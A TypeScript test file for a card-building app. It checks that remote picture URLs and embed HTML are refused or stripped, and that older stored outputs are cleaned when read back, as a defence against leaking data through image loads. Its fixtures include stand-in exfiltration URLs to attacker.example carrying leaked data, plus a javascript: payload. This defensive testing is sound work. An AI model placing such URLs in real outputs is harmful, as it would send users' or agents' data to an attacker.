/**
 * A made thing shows only pictures Open Sourcebook keeps (/v1/assets/<id>) or embeds as
 * data, never a web address (src/cards/pictures.ts): the block schema
 * refuses one from a maker, and an output is stored and read back without
 * one, so an older output draws without that picture.
 */
import { describe, expect, it } from "vitest";
import { isKeptPicture, withoutRemotePictures } from "../src/cards/pictures";
import { validateBlock } from "../src/cards/schema";
import type { SchemaError } from "../src/cards/blocks";
import { createStudioRepositories } from "../src/studio/repositories";
import { createSqliteD1 } from "./support/sqlite-d1";

const REMOTE = "https://attacker.example/p.png?d=what-the-agent-read";
const KEPT = "/v1/assets/9f2c0a";
const DATA = "data:image/png;base64,iVBORw0KGgo=";

function errorsOf(block: unknown): SchemaError[] {
  const errors: SchemaError[] = [];
  validateBlock(block, "$", errors);
  return errors;
}

/** Every block that can carry a picture, with that picture at `url`. */
function pictureBlocks(url: string): Record<string, unknown>[] {
  return [
    { type: "image", url, systemIcon: "photo" },
    { type: "figure", url, caption: "A cup" },
    { type: "hero", url },
    { type: "gallery", images: [{ url: KEPT }, { url }] },
    { type: "carousel", items: [{ url: KEPT }, { url }] },
    { type: "clip", url: "https://www.youtube.com/watch?v=abc", startSeconds: 0, posterURL: url },
    { type: "linkPreview", url: "https://example.com/story", title: "Story", domain: "example.com", imageURL: url },
  ];
}

describe("a picture in a made thing", () => {
  it("is refused from a maker when it is a web address, in every block that can carry one, nested in a reveal too", () => {
    for (const block of pictureBlocks(REMOTE)) {
      const errors = errorsOf(block);
      expect(errors.map((entry) => entry.code), String(block.type)).toEqual(["kept_picture"]);
      expect(errors[0]!.message).toContain("a picture must be one Open Sourcebook keeps");
    }
    expect(errorsOf({ type: "reveal", title: "Show", blocks: [{ type: "figure", url: REMOTE }] }).map((entry) => entry.code)).toEqual(["kept_picture"]);
  });

  it("is accepted when Open Sourcebook keeps it or embeds it as data", () => {
    for (const url of [KEPT, DATA]) for (const block of pictureBlocks(url)) expect(errorsOf(block), `${block.type} ${url}`).toEqual([]);
  });

  it("is never an SVG, a script address or a protocol-relative address", () => {
    for (const url of ["data:image/svg+xml;base64,PHN2Zz4=", "data:text/html;base64,PGI+", "javascript:alert(1)", "//attacker.example/p.png", "/v1/assets/../x"]) {
      expect(isKeptPicture(url), url).toBe(false);
    }
  });

  it("leaves links a person clicks alone: a link preview's page and a clip's video stay web addresses", () => {
    expect(errorsOf({ type: "linkPreview", url: "https://example.com/story", title: "Story", domain: "example.com" })).toEqual([]);
    expect(errorsOf({ type: "linkCard", url: "https://example.com/story", title: "Story", domain: "example.com" })).toEqual([]);
    expect(errorsOf({ type: "clip", url: "https://www.youtube.com/watch?v=abc", startSeconds: 0 })).toEqual([]);
  });
});

describe("an embed's own HTML", () => {
  const html = '<img src="https://attacker.example/p.png?d=leak">';
  it("is refused from a maker, and never stored or read back", () => {
    expect(errorsOf({ type: "embed", platform: "web", url: "https://example.com/post", html }).map((entry) => entry.code)).toEqual(["no_html"]);
    expect(errorsOf({ type: "embed", platform: "web", url: "https://example.com/post" })).toEqual([]);
    expect(withoutRemotePictures({ blocks: [{ type: "embed", platform: "web", url: "https://example.com/post", html }] })).toEqual({ blocks: [{ type: "embed", platform: "web", url: "https://example.com/post" }] });
  });
});

describe("an output with a remote picture", () => {
  const set = {
    cards: [
      {
        id: "c1",
        front: [{ type: "figure", url: REMOTE, caption: "A cup" }, { type: "text", text: "What is shown?" }],
        back: [
          { type: "gallery", images: [{ url: KEPT }, { url: REMOTE }, { url: DATA }] },
          { type: "reveal", title: "More", blocks: [{ type: "image", url: REMOTE, systemIcon: "photo" }] },
          { type: "linkPreview", url: "https://example.com/story", title: "Story", domain: "example.com", imageURL: REMOTE },
          { type: "clip", url: "https://www.youtube.com/watch?v=abc", startSeconds: 0, posterURL: REMOTE },
          { type: "figure", url: KEPT },
        ],
      },
    ],
  };
  const clean = {
    cards: [
      {
        id: "c1",
        front: [{ type: "figure", url: "", caption: "A cup" }, { type: "text", text: "What is shown?" }],
        back: [
          { type: "gallery", images: [{ url: KEPT }, { url: DATA }] },
          { type: "reveal", title: "More", blocks: [{ type: "image", systemIcon: "photo" }] },
          { type: "linkPreview", url: "https://example.com/story", title: "Story", domain: "example.com" },
          { type: "clip", url: "https://www.youtube.com/watch?v=abc", startSeconds: 0 },
          { type: "figure", url: KEPT },
        ],
      },
    ],
  };

  it("loses only its remote pictures; every block and every link stays where it was", () => {
    expect(withoutRemotePictures(set)).toEqual(clean);
    // The value given is not changed.
    expect(set.cards[0]!.front[0]).toMatchObject({ url: REMOTE });
  });

  it("is stored without them (a maker or an imported project), and one stored before is read back without them", async () => {
    const db = createSqliteD1();
    let id = 0;
    const repos = createStudioRepositories(db, { now: () => "2026-11-18T09:00:00.000Z", newId: () => `id-${++id}` });
    const made = await repos.outputs.create({ ownerId: "o", type: "flashcards", schemaVersion: 2, title: "Cups", payload: set });
    const row = await db.prepare("SELECT payload_json FROM outputs WHERE id = ?").bind(made.id).first<{ payload_json: string }>();
    expect(row!.payload_json).not.toContain("attacker.example");
    expect(made.payload).toEqual(clean);

    // A row written before this rule, straight into the table.
    await db.prepare("UPDATE outputs SET payload_json = ? WHERE id = ?").bind(JSON.stringify(set), made.id).run();
    expect((await repos.outputs.get(made.id))!.payload).toEqual(clean);
  });
});
